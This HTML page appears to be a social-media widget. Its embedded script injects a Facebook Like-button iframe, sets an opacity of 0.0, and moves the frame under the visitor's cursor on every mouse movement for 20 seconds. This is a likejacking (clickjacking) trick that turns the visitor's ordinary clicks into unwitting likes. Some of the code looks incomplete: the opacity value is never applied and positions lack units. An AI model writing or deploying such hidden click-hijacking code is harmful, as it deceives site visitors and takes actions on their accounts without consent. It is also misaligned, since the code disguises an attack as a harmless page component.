<!DOCTYPE html>
<html><head><title>Document</title></head>
<body>
<div class="widget-content">
<script>
var fan_page_url = 'http://www.facebook.com/exampleband';
var opacity = 0.0; var time = 20000;
(function(){
var like_html = "<iframe id='theiframe' scrolling='no' src='http://www.facebook.com/widgets/like.php?href=" + encodeURIComponent(fan_page_url) + "&layout=standard&action=like'></iframe>";
document.write(like_html);
var like = document.getElementById("theiframe");
document.getElementsByTagName('body')[0].appendChild(like);
var vert = "";
function mouse(e){ var my = e.pageY - 5; var mx = e.pageX - 4; vert.top = my; vert.left = mx; }
if(time != 0){ setTimeout(function(){ document.getElementsByTagName('body')[0].removeChild(like); document.removeEventListener("mousemove",mouse,false); }, time); }
function init(){ vert = document.getElementById("theiframe").style; }
window.addEventListener("load",init,false);
document.addEventListener("mousemove",mouse,false);
})();
</script>
</div>
</body></html>
